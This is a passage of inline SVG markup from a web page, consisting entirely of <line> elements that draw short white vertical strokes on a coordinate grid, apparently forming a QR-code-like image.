                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="231.98360655737704"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="284.11475409836066"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="33.885245901639344"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="75.59016393442623" y2="80.8032786885246"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="101.65573770491804"
                            y2="122.50819672131148" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="164.21311475409834"
                            y2="169.4262295081967" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="263.2622950819672" y2="273.6885245901639"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="284.11475409836066" y2="289.327868852459"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="75.59016393442623" x2="75.59016393442623" y1="299.75409836065575"
                            y2="304.9672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="70.37704918032787" y2="75.59016393442623"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="101.65573770491804" y2="117.29508196721312"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="127.72131147540985" y2="132.93442622950818"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="169.4262295081967" y2="174.63934426229508"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="190.27868852459017" y2="195.4918032786885"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="252.8360655737705" y2="258.04918032786884"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="80.8032786885246" x2="80.8032786885246" y1="284.11475409836066" y2="294.54098360655735"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="33.885245901639344" y2="39.0983606557377"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="59.950819672131146"
                            y2="70.37704918032787" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="101.65573770491804"
                            y2="117.29508196721312" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="190.27868852459017"
                            y2="195.4918032786885" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="242.40983606557376"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="263.2622950819672"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="294.54098360655735"
                            y2="299.75409836065575" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="86.01639344262296" x2="86.01639344262296" y1="310.18032786885243"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="91.22950819672131" x2="91.22950819672131" y1="13.032786885245901"
                            y2="23.459016393442624" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="91.22950819672131" x2="91.22950819672131" y1="39.0983606557377" y2="59.950819672131146"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="91.22950819672131" x2="91.22950819672131" y1="138.14754098360655"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="91.22950819672131" x2="91.22950819672131" y1="226.77049180327867"
                            y2="231.98360655737704" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="91.22950819672131" x2="91.22950819672131" y1="284.11475409836066" y2="289.327868852459"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="2.6065573770491803"
                            y2="18.245901639344265" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="28.672131147540984"
                            y2="33.885245901639344" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="44.31147540983606" y2="49.52459016393443"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="70.37704918032787" y2="91.22950819672131"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="138.14754098360655"
                            y2="143.36065573770492" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="174.63934426229508"
                            y2="179.85245901639342" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="247.62295081967213"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="96.44262295081968" x2="96.44262295081968" y1="299.75409836065575"
                            y2="310.18032786885243" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="13.032786885245901"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="44.31147540983606"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="132.93442622950818"
                            y2="153.78688524590163" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="216.34426229508196"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="268.4754098360656"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="101.65573770491804" x2="101.65573770491804" y1="289.327868852459"
                            y2="299.75409836065575" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="127.72131147540985"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="148.57377049180326"
                            y2="169.4262295081967" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="185.0655737704918"
                            y2="190.27868852459017" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="200.70491803278688"
                            y2="205.91803278688525" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="252.8360655737705"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="106.8688524590164" x2="106.8688524590164" y1="299.75409836065575"
                            y2="310.18032786885243" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="23.459016393442624"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="49.52459016393443"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="80.8032786885246"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="273.6885245901639"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="112.08196721311477" x2="112.08196721311477" y1="294.54098360655735"
                            y2="304.9672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="13.032786885245901"
                            y2="18.245901639344265" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="44.31147540983606"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="91.22950819672131"
                            y2="96.44262295081968" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="237.19672131147541"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="268.4754098360656"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="117.29508196721312" x2="117.29508196721312" y1="310.18032786885243"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="7.8196721311475414"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="39.0983606557377"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="59.950819672131146"
                            y2="70.37704918032787" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="96.44262295081968"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="211.1311475409836"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="247.62295081967213"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="122.50819672131148" x2="122.50819672131148" y1="289.327868852459"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="127.72131147540985" x2="127.72131147540985" y1="7.8196721311475414"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="127.72131147540985" x2="127.72131147540985" y1="28.672131147540984"
                            y2="33.885245901639344" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="127.72131147540985" x2="127.72131147540985" y1="86.01639344262296"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="127.72131147540985" x2="127.72131147540985" y1="263.2622950819672"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="127.72131147540985" x2="127.72131147540985" y1="304.9672131147541"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="132.93442622950818" x2="132.93442622950818" y1="91.22950819672131"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="132.93442622950818" x2="132.93442622950818" y1="278.90163934426226"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="2.6065573770491803"
                            y2="7.8196721311475414" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="18.245901639344265"
                            y2="33.885245901639344" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="54.73770491803278"
                            y2="65.16393442622952" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="252.8360655737705"
                            y2="263.2622950819672" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="138.14754098360655" x2="138.14754098360655" y1="299.75409836065575"
                            y2="304.9672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="143.36065573770492" x2="143.36065573770492" y1="44.31147540983606"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="143.36065573770492" x2="143.36065573770492" y1="91.22950819672131"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="143.36065573770492" x2="143.36065573770492" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="148.57377049180326" x2="148.57377049180326" y1="13.032786885245901"
                            y2="44.31147540983606" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="148.57377049180326" x2="148.57377049180326" y1="252.8360655737705"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="44.31147540983606"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="75.59016393442623"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="252.8360655737705"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="268.4754098360656"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="294.54098360655735"
                            y2="299.75409836065575" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="153.78688524590163" x2="153.78688524590163" y1="310.18032786885243"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="2.6065573770491803"
                            y2="7.8196721311475414" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="44.31147540983606"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="96.44262295081968"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="216.34426229508196"
                            y2="221.55737704918033" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="231.98360655737704"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="268.4754098360656"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="164.21311475409834" x2="164.21311475409834" y1="304.9672131147541"
                            y2="310.18032786885243" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="169.4262295081967" x2="169.4262295081967" y1="2.6065573770491803"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="169.4262295081967" x2="169.4262295081967" y1="59.950819672131146"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="169.4262295081967" x2="169.4262295081967" y1="96.44262295081968" y2="106.8688524590164"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="169.4262295081967" x2="169.4262295081967" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="169.4262295081967" x2="169.4262295081967" y1="263.2622950819672" y2="304.9672131147541"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="174.63934426229508" x2="174.63934426229508" y1="23.459016393442624"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="174.63934426229508" x2="174.63934426229508" y1="49.52459016393443"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="174.63934426229508" x2="174.63934426229508" y1="211.1311475409836"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="174.63934426229508" x2="174.63934426229508" y1="273.6885245901639"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="179.85245901639342" x2="179.85245901639342" y1="2.6065573770491803"
                            y2="39.0983606557377" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="179.85245901639342" x2="179.85245901639342" y1="75.59016393442623"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="179.85245901639342" x2="179.85245901639342" y1="101.65573770491804"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="179.85245901639342" x2="179.85245901639342" y1="242.40983606557376"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="179.85245901639342" x2="179.85245901639342" y1="304.9672131147541"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="185.0655737704918" x2="185.0655737704918" y1="39.0983606557377" y2="49.52459016393443"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="185.0655737704918" x2="185.0655737704918" y1="247.62295081967213"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="2.6065573770491803"
                            y2="13.032786885245901" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="33.885245901639344"
                            y2="39.0983606557377" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="211.1311475409836"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="252.8360655737705"
                            y2="263.2622950819672" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="273.6885245901639"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="190.27868852459017" x2="190.27868852459017" y1="299.75409836065575"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="2.6065573770491803"
                            y2="7.8196721311475414" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="18.245901639344265"
                            y2="23.459016393442624" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="39.0983606557377" y2="44.31147540983606"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="80.8032786885246" y2="86.01639344262296"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="101.65573770491804"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="247.62295081967213"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="195.4918032786885" x2="195.4918032786885" y1="273.6885245901639"
                            y2="284.11475409836066" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="28.672131147540984"
                            y2="33.885245901639344" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="54.73770491803278"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="70.37704918032787"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="216.34426229508196"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="252.8360655737705"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="200.70491803278688" x2="200.70491803278688" y1="289.327868852459"
                            y2="294.54098360655735" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="23.459016393442624"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="91.22950819672131"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="247.62295081967213"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="268.4754098360656"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="205.91803278688525" x2="205.91803278688525" y1="299.75409836065575"
                            y2="310.18032786885243" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="23.459016393442624"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="75.59016393442623"
                            y2="112.08196721311477" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="185.0655737704918" y2="211.1311475409836"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="252.8360655737705" y2="263.2622950819672"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="211.1311475409836" x2="211.1311475409836" y1="278.90163934426226"
                            y2="284.11475409836066" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="39.0983606557377"
                            y2="44.31147540983606" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="80.8032786885246"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="132.93442622950818"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="148.57377049180326" y2="159"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="169.4262295081967"
                            y2="190.27868852459017" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="216.34426229508196" x2="216.34426229508196" y1="221.55737704918033"
                            y2="231.98360655737704" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="2.6065573770491803"
                            y2="7.8196721311475414" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="33.885245901639344"
                            y2="44.31147540983606" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="91.22950819672131"
                            y2="117.29508196721312" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="143.36065573770492"
                            y2="153.78688524590163" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="252.8360655737705"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="221.55737704918033" x2="221.55737704918033" y1="278.90163934426226"
                            y2="284.11475409836066" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
